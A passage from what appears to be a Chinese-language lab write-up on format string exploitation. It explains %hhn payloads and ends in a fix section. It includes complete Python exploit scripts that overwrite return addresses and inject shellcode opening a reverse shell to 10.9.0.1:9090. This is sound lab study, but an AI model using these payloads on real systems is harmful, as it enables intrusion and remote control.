+<p>第二个<code>%17c%77$hhn</code>表示往<code>0x080e506a</code>写入0xbb。这里可能会纳闷，不是17=0x11吗，为什么是0xbb呢? 这是因为格式化字符串每次写入的数据不仅是%n之前的数字，还包括了之前输出的所有数据。之前我们已经输出了一个0xaa，那么我们只要加上0x11就到达0xbb，由此，我们可以写入到第二个参数位置。</p>
+<p>同样的，我们要往第三个和第四个地址中分别写入0xcc和0xdd。由于差都是0x11，所以我们考虑倒着写入，这样就不用考虑怎样在前面已经输出一个很大的数的条件下怎样写一个小的数字的问题了。格式和之前两个都是类似的。注意最后补齐到4对齐，方便写入正确的地址。</p>
+<p>完整的exp和测试截图如下所示。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line"><span class="comment"># content[4:8]  =  (&quot;abcd&quot;).encode(&#x27;latin-1&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line"><span class="comment"># s = &quot;%.8x&quot;*12 + &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">r&quot;%170c%76$hhn%17c%77$hhn%17c%78$hhn%17c%79$hhnaaa&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">0</span>:<span class="number">0</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line">number  = <span class="number">0x080e506b</span></span><br><span class="line">content[<span class="built_in">len</span>(fmt):<span class="built_in">len</span>(fmt)+<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x080e506a</span></span><br><span class="line">content[<span class="built_in">len</span>(fmt)+<span class="number">4</span>:<span class="built_in">len</span>(fmt)+<span class="number">8</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x080e5069</span></span><br><span class="line">content[<span class="built_in">len</span>(fmt)+<span class="number">8</span>:<span class="built_in">len</span>(fmt)+<span class="number">12</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x080e5068</span></span><br><span class="line">content[<span class="built_in">len</span>(fmt)+<span class="number">12</span>:<span class="built_in">len</span>(fmt)+<span class="number">16</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20220421105854846.png" alt="image-20220421105854846"></p>
+<h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><p>这里要求注入shellcode。其实简单来说，我们只需要把程序的某个返回地址改成shellcode地址即可。借助于上面task3我们能够实现任意地址修改，这里也就不难了。</p>
+<h3 id="question1"><a href="#question1" class="headerlink" title="question1"></a>question1</h3><p><img src="/.io//image-20220421110303017.png" alt="image-20220421110303017"></p>
+<p>为了用具体的地址表示，这里我就根据我的程序的输出来回答了。下面是我的程序的输出。</p>
+<p><img src="/.io//image-20220421110454979.png" alt="image-20220421110454979"></p>
+<p>从下面这张图可以看出，2所在的地址是0xffffd21c，也就是myprintf的frame pointer+4。而3是main中buf的起始地址。也就是0xffffd2f0。</p>
+<p><img src="/.io//image-20220421110856086.png" alt="image-20220421110856086"></p>
+<h3 id="question2"><a href="#question2" class="headerlink" title="question2"></a>question2</h3><p><img src="/.io//image-20220421110907825.png" alt="image-20220421110907825"></p>
+<p>计算一下，那其实就是1的地址和3的地址之差。但是1的地址好像程序没有输出，回看一下源码，应该是要减掉<code>dummy_function</code>中buffer的长度。因此其实也就是1中我们计算的64。所以我们需要64个%x到达3的位置。</p>
+<h3 id="注入shellcode"><a href="#注入shellcode" class="headerlink" title="注入shellcode"></a>注入shellcode</h3><p>由于shellcode已经给好，我们要做的，就是改返回地址为shellcode的地址即可。我们完全可以仿照task3的步骤完成。只不过这里往目标地址写入的内容需要自己找。</p>
+<p>首先确定我们payload的安排。由于printf每次会将之前已经写过的数据用%n放到对应位置，我们考虑将shellcode放在格式化字符串后面。这样我们可以更方便的控制已经写过的数据长度。</p>
+<p>用图的形式表示我们写入的数据方式。如下所示。</p>
+<p><img src="/.io//image-20220422231520364.png" alt="image-20220422231520364"></p>
+<p>解释一下我们构造的如下payload</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">208</span>c%<span class="number">75</span>$hhn%<span class="number">12</span>c%<span class="number">76</span>$hhn%<span class="number">35</span>c%<span class="number">77</span>$hhn%<span class="number">78</span>$hhnaaa(<span class="number">0xffffcfcd</span>)(<span class="number">0xffffcfcc</span>)(<span class="number">0xffffcfce</span>)(<span class="number">0xffffcfcf</span>)</span><br></pre></td></tr></table></figure>
+
+<p>首先，为了传输上的方便，我们都采用单个字节写入。首先明确目的是把shellcode的地址写入目标地址<code>0xffffcfcc</code>。其中shellcode的地址是<code>0xffffd0dc</code>我们把它拆分成单字节。</p>
+<p><code>%208c%75$hhn</code>这一步写入<code>0xffffcfcd</code>208也就是0xd0。</p>
+<p><code>%12c%76$hhn</code>这一步写入<code>0xffffcfcc</code>(208+12)=220=0xdc</p>
+<p><code>%35c%77$hhn</code>这一步写入<code>0xffffcfce</code>(208+12+35)=255=0xff</p>
+<p><code>%78$hhn</code>这一步写入<code>0xffffcfcf</code>0xff(不写入新数据)</p>
+<p>由此，我们完成了没有溢出的格式化字符串驶入数据，写入了一个<code>0xffffd0dc</code></p>
+<p>发现程序输出了success，说明是可以成功的，接下来尝试打开反向shell即可。只需要把shellcode中的内容改成反向shell即可。</p>
+<p><img src="/.io//image-20220421123339345-16505156197111.png" alt="image-20220421123339345"></p>
+<p><img src="/.io//image-20220421123840114.png" alt="image-20220421123840114"></p>
+<p>下面是完整的脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_32</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">0</span>               <span class="comment"># Change this number</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Construct the format string here</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">frame_pointer = <span class="number">0xffffcfc8</span></span><br><span class="line">ret = <span class="number">0xffffcfcc</span></span><br><span class="line">buffer_start = <span class="number">0xffffd0dc</span></span><br><span class="line">s = <span class="string">r&quot;%208c%75$hhn%12c%76$hhn%35c%77$hhn%78$hhnaaa&quot;</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[start:start+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line">number  = <span class="number">0xffffcfcd</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt):start+<span class="built_in">len</span>(fmt)+<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0xffffcfcc</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">4</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">8</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0xffffcfce</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">8</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">12</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0xffffcfcf</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">12</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">16</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(fmt)+<span class="number">16</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">16</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">16</span>+<span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>和32位的思路一模一样。唯一不同的是文档中也提到的：64位地址中不可避免的会出现0。但是由于我们不用strcpy，用的是fgets，可以直接读入\x00。我们只需要这样构造格式化字符串的payload即可。</p>
+<p><img src="/.io//image-20220423144754472.png" alt="image-20220423144754472"></p>
+<p>注意，和上面唯一不同的地方在于，这里的地址只能放在格式化字符串的后面。上面32位的可以放在前也能放在后。这里只能放在后面。因为如果Printf遇到00就不会接着往下打印，那么也就不会执行到我们上面黄色的格式化字符的地方。由于上面32位的我们也是将地址放在格式化字符串后面，所以基本没有什么问题。</p>
+<p>下面最后解释一下payload</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">64</span>c%<span class="number">42</span>$hhn%<span class="number">63</span>c%<span class="number">43</span>$hhn%<span class="number">97</span>c%<span class="number">44</span>$hhn%<span class="number">31</span>c%<span class="number">45</span>$hhn%<span class="number">46</span>$hhn%<span class="number">47</span>$hhnaaaaba(<span class="number">0x00007fffffffdf18</span>)(<span class="number">0x00007fffffffdf1d</span>)(<span class="number">0x00007fffffffdf19</span>)(<span class="number">0x00007fffffffdf1b</span>)(<span class="number">0x00007fffffffdf1a</span>)(<span class="number">0x00007fffffffdf1c</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>%64c%42$hhn</code>表示往<code>0x00007fffffffdf18</code>写入64也就是0x40。</p>
+<p><code>%63c%43$hhn</code>表示往<code>0x00007fffffffdf1d</code>写入(63+64)也就是0x7f</p>
+<p><code>%97c%44$hhn</code>表示往<code>0x00007fffffffdf19</code>写入(63+64+97)也就是0xe0</p>
+<p><code>%31c%45$hhn</code>表示往<code>0x00007fffffffdf1b</code>写入(63+64+97+31)也就是0xff</p>
+<p><code>%46$hhn%47$hhn</code>表示往<code>0x00007fffffffdf1a</code>以及<code>0x00007fffffffdf1c</code>写入0xff（和之前一样）。</p>
+<p>综上所述，我们往0x00007fffffffdf18写入了0x7fffffe040。<strong>注意，小端法中高位是指先将数字转换为小端法之后的高位</strong>。例如<code>0x7fffffffe040</code>转换为<code>\x40\xe0\xff\xff\xff\x7f\x00\00</code>。其中00是转换后的最低位，因此要填充到地址的最高位。那么我们需要在相应字节如下填写。</p>
+<p><img src="/.io//image-20220423151615031.png" alt="image-20220423151615031"></p>
+<p>这里也终于算是搞清楚了小端法的意义：我们首先把要储存的东西转化为小端法。例如0xdeadbeef就是\xef\xbe\xad\xde，之后储存就是从左往右依次储存，比如我们要存在0x1000的位置，那么0x1000就是\xef，0x1001就是\xbe，0x1002就是\xad，0x1003就是\xde，这个储存方法都是不变的，都是从左边开始往右边存。之前讲的什么低地址放高位之类的，真是害人不浅啊….</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">0</span>               <span class="comment"># Change this number</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Construct the format string here</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">frame_pointer = <span class="number">0x00007fffffffdf10</span></span><br><span class="line">ret = <span class="number">0x00007fffffffdf18</span></span><br><span class="line">buffer_start = <span class="number">0x00007fffffffdfd0</span></span><br><span class="line">s = <span class="string">r&quot;%64c%42$hhn%63c%43$hhn%97c%44$hhn%31c%45$hhn%46$hhn%47$hhnaaaaba&quot;</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[start:start+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line">number  = <span class="number">0x00007fffffffdf18</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt):start+<span class="built_in">len</span>(fmt)+<span class="number">8</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x00007fffffffdf1d</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">8</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">16</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x00007fffffffdf19</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">16</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">24</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x00007fffffffdf1b</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">24</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">32</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x00007fffffffdf1a</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">32</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">40</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x00007fffffffdf1c</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">40</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">48</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(fmt)+<span class="number">16</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">48</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">48</span>+<span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image-20220421131130079.png" alt="image-20220421131130079"></p>
+<p>接下来尝试反向shell，可以看到也成功了。</p>
+<p><img src="/.io//image-20220421131242295.png" alt="image-20220421131242295"></p>
+<h2 id="fix-the-problem"><a href="#fix-the-problem" class="headerlink" title="fix the problem"></a>fix the problem</h2><p>解决这个问题其实很简单..只需要把printf加上一个固定的格式化字符串就可以了。</p>
+<p>将下面的<code>my_printf</code>改成如下所示内容即可。最重要的就是把printf加上一个固定的格式化字符串。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">myprintf</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="comment">// Save the rbp value into 